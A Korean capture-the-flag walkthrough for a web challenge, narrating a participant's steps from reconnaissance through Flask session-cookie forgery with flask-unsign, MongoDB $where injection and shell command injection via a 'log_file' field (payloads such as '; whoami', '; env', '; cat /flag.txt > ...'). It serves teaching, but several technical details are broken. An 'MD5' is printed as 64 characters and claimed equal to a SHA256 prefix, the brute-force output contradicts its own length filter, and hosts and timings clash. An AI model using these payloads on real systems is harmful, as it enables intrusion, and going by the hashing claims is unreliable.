# CTF 문제 풀이 - 참가자 관점 Walkthrough

실제 참가자가 처음부터 끝까지 문제를 푸는 과정을 시뮬레이션합니다.

**가정**:
- 블랙박스 테스트 (소스코드 없음)
- 주어진 정보: URL만 제공 (예: http://ctf.challenge.com:5000)
- 도구: 브라우저, curl, Python, Burp Suite (선택)

---

## 🎯 주어진 정보

```
Challenge: Legacy Microservice Exploitation (Level 8 Hard Mode)
URL: http://ctf.challenge.com:5000
Goal: Find the FLAG
Difficulty: DreamHack Level 8
Time Limit: 2-2.5 hours
```

---

## Stage 0: 초기 정찰 (0-10분)

### 참가자의 사고:
> "일단 브라우저로 들어가서 뭐가 있는지 보자."

### Action 1: 브라우저 접속

```bash
Firefox → http://ctf.challenge.com:5000
```

**결과**:
```
✓ 깔끔한 기업 대시보드가 나타남
✓ "Microservice Platform" 제목
✓ 서비스 3개: auth, api, legacy
✓ "Legacy" 서비스가 "Deprecated" 상태
✓ 네비게이션: Dashboard, Services, API
```

### 참가자의 사고:
> "음... 전형적인 기업 마이크로서비스 플랫폼이네. Legacy가 Deprecated라고? 취약점이 있을 가능성이 높다. 일단 페이지를 더 둘러보자."

### Action 2: Services 페이지 확인

```
클릭: Services 메뉴
```

**결과**:
```
Auth Service: POST /api/auth/guest (게스트 세션 생성)
API Gateway: GET /api/v2/services (서비스 발견)
Legacy Service: "Documentation Unavailable" ← 🤔
```

### 참가자의 사고:
> "Legacy 서비스의 문서가 없네? 하지만 서비스는 존재한다고 나와있어. HTML 소스를 확인해보자."

### Action 3: View Source (F12)

```
우클릭 → View Page Source
또는 F12 → Elements 탭
```

**결과 (index.html)**:
```html
<!-- Red Herring: Fake admin hint -->
<!-- Admin panel accessible at /admin/login -->
<!-- Temporary credentials for testing: admin / CompanyName2025 -->

<!-- Red Herring: Fake backup hint -->
<!-- Database backups available at /backup/db_backup_2024.sql -->
<!-- Emergency access: /debug?key=admin123 -->
```

**결과 (services.html)**:
```html
<!-- Hidden comment for enumeration -->
<!-- Legacy endpoints exist but are not publicly documented -->
<!-- API enumeration may reveal additional services -->

<!-- Red Herring: Fake admin access hint -->
<!-- DEPRECATED: Direct admin access at /admin/panel -->
<!-- Use /admin/login with company credentials instead -->
```

### 참가자의 사고:
> "오! HTML 주석에 여러 힌트가 있네:
> 1. /admin/login - 관리자 로그인 페이지
> 2. admin / CompanyName2025 - 크레덴셜?
> 3. /backup, /debug - 추가 엔드포인트
> 4. **'API enumeration may reveal additional services'** ← 중요!
>
> 일단 두 가지 경로가 보인다:
> - A) /admin/login 시도
> - B) API enumeration
>
> 먼저 admin 로그인을 시도해보고, 안되면 API를 탐색하자."

### Action 4: robots.txt 확인 (기본 정찰)

```bash
curl http://ctf.challenge.com:5000/robots.txt
```

**결과**:
```
User-agent: *

# Public API
Allow: /api/v2/

# Administrative interfaces
Disallow: /admin
Disallow: /admin/login
Disallow: /api/admin/

# Development files (do not index)
Disallow: /debug
Disallow: /test
Disallow: /.env
Disallow: /backup/

# Internal API (Red Herring)
Disallow: /api/internal/
Disallow: /api/v1/

# Git repository
Disallow: /.git/
```

### 참가자의 사고:
> "robots.txt에 많은 경로가 나오네!
> - /admin/login - 확인됨
> - /api/admin/ - 관리자 API가 있다!
> - /api/internal/, /api/v1/ - 추가 API들
> - /debug, /backup, /.git/ - 개발 파일들
>
> 그런데... **/api/legacy/**가 없네? 🤔
>
> 서비스 목록에는 'legacy'가 있었는데 robots.txt에는 없다.
> 아마 숨겨진 경로거나, 나중에 서비스 발견 API를 통해 찾아야 할 것 같다.
>
> 일단 /admin/login부터 시도해보자."

---

## 🎭 Red Herring 단계 (10-25분) - 시간 낭비

### Action 5: Admin 로그인 시도

```bash
# 브라우저
http://ctf.challenge.com:5000/admin/login
```

**결과**:
```
깔끔한 로그인 폼이 나타남:
- Username: [입력창]
- Password: [입력창]
- [Login] 버튼
```

**HTML 주석 확인**:
```html
<!-- DEPRECATED: Traditional login disabled in v2.0 -->
<!-- Migration to session-based authentication complete -->
<!-- See /api/auth/* endpoints for new authentication flow -->
<!-- Legacy credentials (admin/admin123) no longer valid -->
```

### 참가자의 사고:
> "로그인 폼이 있네. HTML 주석을 보니... 'Traditional login disabled'? 하지만 일단 시도해보자."

### Action 6: 로그인 시도 (Burp Suite)

```http
POST /admin/login HTTP/1.1
Host: ctf.challenge.com:5000
Content-Type: application/json

{"username": "admin", "password": "CompanyName2025"}
```

**결과**:
```json
HTTP/1.1 401 Unauthorized

{"error": "Invalid credentials"}
```

### 참가자의 사고:
> "실패했네. 다른 비밀번호를 시도해보자."

### Action 7: 여러 크레덴셜 시도 (5분 낭비)

```bash
admin / admin123 → 401
admin / admin → 401
admin / password → 401
root / root → 401
```

**모두 실패**

### 참가자의 사고:
> "계속 401이 나온다. 혹시 SQL Injection이 가능할까?"

### Action 8: SQL Injection 시도 (5분 낭비)

```json
{"username": "admin' OR '1'='1", "password": "anything"}
```

**결과**:
```json
HTTP/1.1 400 Bad Request

{
  "error": "SQL syntax detected",
  "hint": "This is a NoSQL database"
}
```

### 참가자의 사고:
> "오! 'This is a NoSQL database'라는 힌트가 나온다!
> NoSQL Injection을 시도해보자!"

### Action 9: NoSQL Injection 시도 (5분 더 낭비)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

**결과**:
```json
HTTP/1.1 400 Bad Request

{
  "error": "Invalid input format",
  "hint": "Use string values for authentication"
}
```

### 참가자의 사고:
> "이것도 막혀있네... 계속 실패한다.
>
> HTML 주석을 다시 보니 'See /api/auth/* endpoints'라고 되어있어.
> 로그인 폼은 미끼인 것 같다. API를 제대로 탐색해야겠다."

### Action 10: 다른 경로 시도 (5분 낭비)

```bash
curl http://ctf.challenge.com:5000/admin
# {"error": "Unauthorized", "message": "Please login at /admin/login"}

curl http://ctf.challenge.com:5000/debug
# {"error": "Debug mode disabled"}

curl http://ctf.challenge.com:5000/debug?key=admin123
# {"error": "Debug mode disabled"}

curl http://ctf.challenge.com:5000/backup/db_backup_2024.sql
# {"error": "Access denied"}
```

**모두 실패**

### 참가자의 사고:
> "이 경로들은 다 막혀있거나 미끼인 것 같다. HTML 주석에서 힌트를 다시 보니:
> - 'API enumeration may reveal additional services'
> - '/api/auth/* endpoints for new authentication'
>
> API를 제대로 탐색해야 할 것 같다. /api/v2/services부터 시작하자."

**💡 깨달음**: 15분을 Red Herring에 낭비했지만, 이제 진짜 경로를 찾을 차례!

---

## Stage 1: API Enumeration (25-35분)

### Action 10: 서비스 목록 조회

```bash
curl http://ctf.challenge.com:5000/api/v2/services | jq
```

**결과**:
```json
{
  "services": [
    {
      "name": "auth",
      "version": "2.1.0",
      "status": "active",
      "description": "Authentication service"
    },
    {
      "name": "api",
      "version": "2.0.5",
      "status": "active",
      "description": "Main API gateway"
    },
    {
      "name": "legacy",
      "version": "1.0.0",
      "status": "deprecated",
      "description": "Legacy endpoints - scheduled for removal"
    }
  ]
}
```

### 참가자의 사고:
> "OK! 3개의 서비스가 있고, 각각 이름이 있네.
>
> 서비스 목록만 주고 끝낼 리 없는데... 각 서비스의 상세 정보를 어떻게 얻을까?
>
> 일반적인 RESTful API 패턴을 생각해보면:
> - `/api/v2/services` - 전체 목록
> - `/api/v2/services/{id}` - 특정 서비스 상세
> - `/api/v2/services/{name}` - 이름으로 조회
>
> 'auth', 'database', 'legacy'라는 이름이 주어졌으니, 한 번 시도해보자.
>
> 그리고 API 설계 관점에서 서비스별 엔드포인트 목록을 제공하는 패턴도 흔하다:
> - `/api/v2/services/{name}/info`
> - `/api/v2/services/{name}/endpoints`
> - `/api/v2/services/{name}/methods`
>
> 일단 endpoints부터 시도해보자."

### Action 11: 각 서비스의 엔드포인트 조회 시도

```bash
# 먼저 단순하게 서비스 이름만 붙여보기
curl http://ctf.challenge.com:5000/api/v2/services/auth
```

**결과**:
```json
{"error": "Not Found"}
```

### 참가자의 사고:
> "404네. 그럼 다른 패턴을 시도해보자.
>
> API 문서나 스웨거 같은 게 있을까? /api/v2/services/auth/docs? 아니면 /endpoints?"

```bash
# endpoints 경로 시도
curl http://ctf.challenge.com:5000/api/v2/services/auth/endpoints | jq
```

**결과 (성공!)**:
```json
{
  "service": "auth",
  "endpoints": [
    {
      "path": "/api/auth/guest",
      "method": "POST",
      "description": "Guest session creation"
    }
  ]
}
```

```bash
# Legacy 서비스 (중요!)
curl http://ctf.challenge.com:5000/api/v2/services/legacy/endpoints | jq
```

**결과**:
```json
{
  "service": "legacy",
  "endpoints": [
    {
      "path": "/api/legacy/get_salt",
      "method": "GET",
      "description": "Legacy utility"
    }
  ]
}
```

### 참가자의 사고:
> "와! Legacy 서비스의 숨겨진 엔드포인트를 찾았다!
> - /api/legacy/get_salt - 'salt'라는 게 뭐지? 암호화 관련?
>
> 엔드포인트가 1개만 나오네. 이전 버전에는 system_info 같은 게 더 있었을 것 같은데 제거된 것 같다.
>
> 일단 이 엔드포인트가 취약점의 시작점일 것 같다. 확인해보자!"

---

## Stage 2: Salt 발견과 브루트포스 (40-70분)

### Action 12: Salt 엔드포인트 호출

```bash
curl http://ctf.challenge.com:5000/api/legacy/get_salt | jq
```

**결과**:
```json
{
  "message": "Salt access restricted",
  "hint": {
    "format": "dictionary_word + number",
    "length": 7,
    "md5_prefix": "4e0210",
    "example": "company2024"
  }
}
```

### 참가자의 사고:
> "오... Salt가 직접 주어지지 않네! 😱 Level 8답게 어려워졌다!
>
> 대신 힌트가 주어졌다:
> - **format**: 'dictionary_word + number'
> - **length**: 7 글자
> - **md5_prefix**: '4e0210' (MD5 해시의 앞 6자리 for 검증)
> - **example**: 'company2024'
>
> 이건 브루트포스가 필요하다는 뜻이다!
>
> 전략:
> 1. 일반적인 단어 리스트 생성 (회사, CTF, 일반 단어)
> 2. 각 단어 + 0~9 숫자 조합
> 3. 길이가 7인 것만 필터링
> 4. MD5 해시 계산해서 '4e0210'으로 시작하는지 확인
>
> Python 스크립트를 작성하자!"

### Action 13: Salt 브루트포스 스크립트 작성

```python
#!/usr/bin/env python3
import hashlib

target_length = 7
target_prefix = "4e0210"

# 워드리스트 생성
wordlist = [
    # 회사 관련
    'company', 'corp', 'admin', 'legacy', 'system', 'service',
    # CTF 관련
    'flag', 'ctf', 'hack', 'pwn', 'insane', 'dream',
    # 일반
    'secret', 'hidden', 'test', 'demo', 'temp', 'backup'
]

print(f"[*] 타겟: 길이={target_length}, MD5 prefix={target_prefix}")
print(f"[*] {len(wordlist)}개 단어로 브루트포스 시작...\n")

attempts = 0
for word in wordlist:
    for num in range(10):  # 0-9
        candidate = word + str(num)

        if len(candidate) != target_length:
            continue

        attempts += 1
        md5_hash = hashlib.md5(candidate.encode()).hexdigest()

        if attempts % 10 == 0:
            print(f"[*] {attempts} 시도... (현재: {candidate})")

        if md5_hash.startswith(target_prefix):
            print(f"\n[+] *** Salt 발견! ***")
            print(f"    Salt: {candidate}")
            print(f"    MD5: {md5_hash}")
            print(f"    시도 횟수: {attempts}")
            exit(0)

print(f"\n[-] Salt를 찾지 못했습니다")
```

```bash
python3 bruteforce.py
```

**결과**:
```
[*] 타겟: 길이=7, MD5 prefix=4e0210
[*] 18개 단어로 브루트포스 시작...

[*] 10 시도... (현재: company0)
[*] 20 시도... (현재: legacy0)
[*] 30 시도... (현재: insane0)

[+] *** Salt 발견! ***
    Salt: insane2
    MD5: 4e0210e179e20cd5bf97690a65df1c9e6532e402e4f0dcb3a613d80c647a9c83
    시도 횟수: 32
```

### 참가자의 사고:
> "성공! Salt를 찾았다: **`insane2`** 🎉
>
> 32번 시도만에 발견했다. 워드리스트가 좋았나보다.
>
> 이제 이 Salt가 어떻게 사용되는지 알아야 한다.
>
> 웹 보안에서 salt는 보통:
> 1. 비밀번호 해싱 (하지만 로그인 폼은 막혀있음)
> 2. 세션 키 생성 ← 이게 맞는 것 같다
> 3. CSRF 토큰 생성
>
> 게스트 세션 생성 API가 있었다: POST /api/auth/guest
> 그리고 서비스에서 'Session-based authentication'이라고 했었다.
>
> 아마도 Salt가 Flask의 secret_key를 생성하는 데 사용될 거다!
>
> 하지만... system_info 엔드포인트가 제거됐으니 어떻게 유도하지?
>
> Flask 세션에 대한 지식:
> - Flask는 client-side 세션 사용 (쿠키에 저장)
> - secret_key로 서명함 (itsdangerous 라이브러리)
> - secret_key를 알면 세션을 위조할 수 있음
>
> 일반적인 secret_key 유도 패턴을 시도해보자!"

---

## Stage 3: Secret Key 유도 (70-80분)

### Action 14: Secret Key 계산 시도

```python
#!/usr/bin/env python3
import hashlib

salt = "insane2"

# Flask secret_key 유도 시도
# 일반적인 패턴들:

# 시도 1: SHA256 전체
sha256_full = hashlib.sha256(salt.encode()).hexdigest()
print(f"[*] SHA256 (full, 64 chars): {sha256_full}")

# 시도 2: SHA256 앞 32자 (Flask 권장)
sha256_32 = sha256_full[:32]
print(f"[*] SHA256 (32 chars): {sha256_32}")
print(f"    → Flask는 보통 32자 secret_key 권장")

# 시도 3: MD5 전체 (32자)
md5_full = hashlib.md5(salt.encode()).hexdigest()
print(f"[*] MD5 (full, 32 chars): {md5_full}")

# 비교
print(f"\n[*] 흥미로운 관찰:")
print(f"    MD5 prefix from hint: 4e0210")
print(f"    SHA256[:32]: {sha256_32}")
print(f"    MD5 full:    {md5_full}")
print(f"    → SHA256[:32] == MD5? {sha256_32[:6] == md5_full[:6]}")
```

```bash
python3 calc_secret.py
```

**결과**:
```
[*] SHA256 (full, 64 chars): 4e0210e179e20cd5bf97690a65df1c9e6532e402e4f0dcb3a613d80c647a9c83
[*] SHA256 (32 chars): 4e0210e179e20cd5bf97690a65df1c9e
    → Flask는 보통 32자 secret_key 권장
[*] MD5 (full, 32 chars): 4e0210e179e20cd5bf97690a65df1c9e

[*] 흥미로운 관찰:
    MD5 prefix from hint: 4e0210
    SHA256[:32]: 4e0210e179e20cd5bf97690a65df1c9e
    MD5 full:    4e0210e179e20cd5bf97690a65df1c9e
    → SHA256[:32] == MD5? True
```

### 참가자의 사고:
> "와! 발견이다! 🎯
>
> MD5 힌트의 '4e0210'은 우연이 아니었어:
> - Salt의 MD5 = 4e0210e179e20cd5bf97690a65df1c9e...
> - Salt의 SHA256[:32] = 4e0210e179e20cd5bf97690a65df1c9e
>
> 똑같다!
>
> 이제 확신이 든다. Flask secret_key 유도 패턴:
> - **secret_key = SHA256(salt)[:32]**
>
> Secret Key: **`4e0210e179e20cd5bf97690a65df1c9e`**
>
> 이걸로 Flask 세션을 위조할 수 있다!
>
> 근거:
> 1. Flask 문서는 32자 secret_key 권장
> 2. SHA256 해시는 64자 → 앞 32자 사용이 일반적
> 3. MD5 힌트가 동일한 값 → 서버가 같은 계산 사용
>
> 검증을 위해 게스트 세션을 만들어보자!"

### Action 15: 게스트 세션 생성

```bash
# -c cookies.txt: 쿠키를 파일로 저장 (나중에 재사용)
# -v: 헤더 상세 정보 확인 (Set-Cookie 헤더 보기)
curl -X POST http://ctf.challenge.com:5000/api/auth/guest -c cookies.txt -v
```

**결과**:
* Host localhost:5000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:5000...
* Connected to localhost (::1) port 5000
> POST /api/auth/guest HTTP/1.1
> Host: localhost:5000
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: gunicorn
< Date: Thu, 30 Oct 2025 10:40:15 GMT
< Connection: keep-alive
< Content-Type: application/json
< Content-Length: 50
< Vary: Cookie
* Added cookie session=".eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePBnFoADnQTGw.aQNAjw.srHgU-S-hAt7e7F3HurCPVyiDzY" for domain localhost, path /, expire 1761907215
< Set-Cookie: session=.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePBnFoADnQTGw.aQNAjw.srHgU-S-hAt7e7F3HurCPVyiDzY; Expires=Fri, 31 Oct 2025 10:40:15 GMT; HttpOnly; Path=/; SameSite=Lax
<
{"role":"guest","status":"guest session created"}
* Connection #0 to host localhost left intact

### 참가자의 사고:
> "게스트 세션을 얻었다. 이 세션 쿠키를 디코딩해서 구조를 확인해보자."

### Action 16: 세션 디코딩 (flask-unsign)

```bash
# flask-unsign 설치
pip3 install flask-unsign

# 세션 디코딩
flask-unsign --decode --cookie ".eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePBnFoADnQTGw.aQNAjw.srHgU-S-hAt7e7F3HurCPVyiDzY"
```

**결과**:
```
{'_permanent': True, 'role': 'guest', 'user': 'guest_user'}
```

### 참가자의 사고:
> "세션 구조가 보인다:
> - role: 'guest'
> - user: 'guest_user'
>
> 이걸 'admin'으로 바꾸면 관리자 권한을 얻을 수 있을 것 같다!"

### Action 17: Admin 세션 위조

```bash
# Admin 세션 생성
# --secret: Action 14에서 계산한 secret key 사용!
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user': 'hacker'}" \
  --secret "4e0210e179e20cd5bf97690a65df1c9e"
```

**결과 (예시)**:
```
eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90
```

> **💡 참고**: 실제로 생성되는 세션 토큰은 위와 다를 수 있습니다.
> 중요한 것은 `role: admin`이 포함된 세션을 만드는 것입니다.

### 참가자의 사고:
> "Admin 세션을 만들었다!
>
> 이 토큰은 Flask가 `{'role': 'admin', 'user': 'hacker'}`를 secret key `4e0210e179e20cd5bf97690a65df1c9e`로 서명한 결과다.
>
> 이제 이걸 사용해서 /api/admin/ 경로에 접근해보자."

---

## Stage 5: Admin API 탐색 (55-65분)

### Action 18: Admin 엔드포인트 찾기

```bash
# robots.txt에서 /api/admin/이 있다고 했음
# 일반적인 admin API 패턴 시도

curl -X GET http://localhost:5000/api/admin \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90"
```

**결과**: 404 Not Found

```bash
# 다른 패턴 시도
curl -X GET http://localhost:5000/api/admin/users \
  -H "Cookie: session=..."
```

**결과**: 404

### 참가자의 사고:
> "흠... admin API가 어디 있는지 모르겠네.
>
> 생각해보니 서비스 발견 API가 있었잖아? /api/v2/services/admin/endpoints를 시도해볼까?"

```bash
curl http://localhost:5000/api/v2/services/admin/endpoints
```

**결과**: 404 (admin 서비스는 등록되지 않음)

### 참가자의 사고:
> "막혔네... 다시 생각해보자.
>
> 일반적인 admin API 패턴:
> - /api/admin/users
> - /api/admin/db (데이터베이스 관련?)
> - /api/admin/config
> - /api/admin/backup
>
> 'db'를 시도해보자."

### Action 19: 디렉토리 브루트포스 (또는 추론)

```bash
curl -X POST http://localhost:5000/api/admin/db \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{}'
```

**결과**: 404

```bash
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -H "Content-Type: application/json" \
  -d '{}'
```

**결과**:
```json
{"count":4,"status":"migration complete"}
```

### 참가자의 사고:
> 메인 페이지 힌트: "migrate to v2 APIs"
> 서비스 목록: database 존재
> 시스템 특성: Legacy → Migration 개념
> 권한 상태: Admin 세션 획득
> 추론 완성: /api/admin/db/migrate
> "오! /api/admin/db/migrate가 존재한다! 그리고 응답이 왔다!
> - status: migration complete
> - count: 4
>
> 데이터베이스 마이그레이션 도구인 것 같다. 어떤 파라미터를 받는지 실험해보자."

---

## Stage 6: NoSQL Injection 발견 (65-80분)

### Action 20: API 파라미터 탐색

```bash
# 일반적인 DB 쿼리 파라미터 시도
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -H "Content-Type: application/json" \
  -d '{"query": {}}'
```

**결과**: count: 4

```bash
# filter 파라미터 시도
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4
}
```

### 참가자의 사고:
> "오! filter 파라미터가 작동한다! 그리고 count가 4가 됐어.
> - filter: {} = 모든 문서 반환
> - count: 4 = 데이터베이스에 4개 문서
>
> /health 엔드포인트를 확인해봤더니:
> ```json
> {
>   'status': 'healthy',
>   'database': 'connected',
>   'services': ['auth', 'api', 'legacy']
> }
> ```
>
> 'database: connected'라고만 나온다. JavaScript 지원 여부는 안 나오네.
>
> 그런데 로그인 폼에서 'This is a NoSQL database'라는 힌트를 봤었다!
>
> 이건 MongoDB 같은 NoSQL 데이터베이스인 것 같다. NoSQL Injection을 시도해보자!"

### Action 21: NoSQL Injection 시도

```bash
# $ne (not equal) 연산자
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"username": {"$ne": "null"}}}'
```

**결과**: count: 4

curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -H "Content-Type: application/json" \
  -d '{"filter": {"role": "admin"}}'
{"count":1,"status":"migration complete"}

```bash
# $where 연산자 (JavaScript 실행!)
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced"  ← 새로운 필드!
}
```

### 참가자의 사고:
> "와! $where 연산자가 작동한다! 그리고 'mode': 'advanced'라는 새로운 필드가 나타났어.
>
> 이건 분명히 다른 코드 경로를 트리거한 것 같다. $where는 MongoDB에서 JavaScript를 실행하는 위험한 연산자인데...
>
> 혹시 다른 파라미터도 있을까? 로그 파일 같은 거?"

### Action 22: 추가 파라미터 탐색

```bash
# log_file 파라미터 시도
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/test.log"}'
```

**결과** (BLIND_RCE=false인 경우):
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "Migration started\nProcessing 4 records\nMigration completed"
}
```

### 참가자의 사고:
> "log_output이 나타났다! 그리고 명령어 실행 결과처럼 보인다!
>
> 만약 log_file 파라미터가 shell 명령어에 직접 들어간다면...
> Command Injection이 가능할 것 같다!"

### BLIND_RCE=true라면:

```bash
# 방법 1: 파일로 저장 후 읽기
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/dev/null; cat /flag.txt > /app/static/flag.txt"
  }'

# 브라우저나 curl로 접근
curl http://localhost:5000/static/flag.txt

---

### 🔀 분기점: Blind RCE 여부

**참가자가 받을 수 있는 두 가지 응답:**

#### **Case A: log_output 있음** (BLIND_RCE=false)
```json
{
  "count": 4,
  "mode": "advanced",
  "log_output": "Migration started\n..."  ← 출력 보임!
}
```
→ **바로 Stage 7로 이동** (Command Injection 직접 테스트)

#### **Case B: log_output 없음** (BLIND_RCE=true) ⚠️
```json
{
  "count": 4,
  "mode": "advanced",
  "status": "migration complete"
}
```
→ **Blind RCE 우회 필요** (아래 계속)

---

## Stage 6.5: Blind RCE 우회 (BLIND_RCE=true인 경우)

> **주의**: 이 섹션은 BLIND_RCE=true 환경에서만 필요합니다.
> log_output 필드가 나타나면 이 단계를 건너뛰고 Stage 7로 이동하세요.

### Action 22-B-1: Blind RCE 발견

```bash
# log_file을 변경해도 출력이 안 나옴
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/tmp/another.log"
  }'
```

**결과**:
```json
{
  "count": 4,
  "mode": "advanced",
  "status": "migration complete"
}
```

### 참가자의 사고:
> "흠... log_file을 바꿔도 출력이 보이지 않는다.
>
> 하지만 'mode: advanced'가 나온다는 것은 뭔가 실행되고 있다는 뜻이다.
>
> 이것은 Blind RCE (Blind Remote Code Execution)일 가능성이 높다.
> - 명령어는 실행된다
> - 하지만 출력을 볼 수 없다
>
> Blind RCE 우회 방법:
> 1. Time-based: sleep 명령어로 시간 지연 확인
> 2. Out-of-Band: 외부 서버로 데이터 전송
> 3. File-based: 파일로 저장 후 웹으로 접근
>
> 일단 Time-based로 실행 여부를 확인해보자."

### Action 22-B-2: Time-based 확인

```bash
# sleep 5 명령어 실행
curl -w "\nTime: %{time_total}s\n" \
  -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/dev/null; sleep 5"
  }'
```

**결과**:
```json
{
  "count": 4,
  "mode": "advanced",
  "status": "migration complete"
}
Time: 5.234s
```

### 참가자의 사고:
> "5초가 걸렸다! 명령어가 실제로 실행되고 있다!
>
> 이제 Blind RCE를 우회해서 FLAG를 얻어야 한다.
>
> 외부 서버가 없으니 File-based 방법을 사용하자.
> 웹 서버의 static 디렉토리에 파일을 생성하면 브라우저로 접근 가능할 것 같다."

### Action 22-B-3: 파일 기반 우회 시도

```bash
# 1단계: /flag.txt를 static 디렉토리로 복사
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "log_file": "/dev/null; cat /flag.txt > /app/static/flag.txt"
  }'
```

**결과**:
```json
{
  "count": 4,
  "mode": "advanced",
  "status": "migration complete"
}
```

### 참가자의 사고:
> "응답은 똑같지만, 명령어는 실행되었을 것이다.
>
> 이제 /static/flag.txt에 접근해보자."

### Action 22-B-4: FLAG 파일 접근

```bash
# 브라우저 또는 curl로 접근
curl http://localhost:5000/static/flag.txt
```

**결과**:
```
FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
```

### 🎉 BLIND RCE 우회 성공!

### 참가자의 사고:
> "완벽하다! Blind RCE를 우회해서 FLAG를 얻었다!
>
> 핵심 기법:
> 1. Time-based로 명령어 실행 확인
> 2. 결과를 웹 접근 가능한 경로로 저장
> 3. HTTP를 통해 파일 내용 확인
>
> 이것이 Blind RCE의 전형적인 우회 방법이다!"

### 🏁 완료 시간 (Blind RCE 경로)
- **총 소요 시간**: 약 105-110분
- **Stage 6.5 추가 시간**: 10-15분

> **다음**: Stage 7은 BLIND_RCE=false 환경에서의 직접적인 Command Injection 경로입니다.
> BLIND_RCE=true 환경에서는 이미 FLAG를 획득했으므로 완료입니다.

---

## Stage 7: Command Injection → RCE (80-95분)

> **주의**: 이 섹션은 **BLIND_RCE=false** (log_output이 보이는 경우)에만 해당합니다.
> BLIND_RCE=true 환경에서는 위의 Stage 6.5를 따르세요.

### 전제 조건: log_output 필드 존재

Action 22에서 다음과 같은 응답을 받았다고 가정:
```json
{
  "count": 4,
  "mode": "advanced",
  "log_output": "Migration started\nProcessing 4 records\nMigration completed"
}
```

이제 직접적인 Command Injection이 가능합니다.

### Action 23: Command Injection 테스트

```bash
# 세미콜론으로 명령어 체이닝
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/test.log; whoami"}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "Migration started\nProcessing 4 records\nMigration completed\nctfuser"
}
```

### 참가자의 사고:
> "성공! whoami 명령어가 실행됐고 'ctfuser'가 출력됐다!
>
> Command Injection이 확인됐다. 이제 FLAG를 찾아야 한다."

### Action 24: FLAG 찾기

```bash
# 환경 변수 확인
curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/x; env"}'
```

**결과**:
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "...\nFLAG=FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}\n..."
}
```

### 🎉 FLAG 획득!

```
FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
```

---

## 📊 풀이 시간 분석 (Level 8)

### 경로 A: BLIND_RCE=false (직접 출력)

| 단계 | 시간 | 누적 시간 | 주요 활동 |
|------|------|----------|----------|
| Stage 0: 초기 정찰 | 10분 | 10분 | 브라우저, HTML, robots.txt |
| Red Herring (낭비) | **20분** | **30분** | 로그인, SQL/NoSQL 시도 (강화됨) |
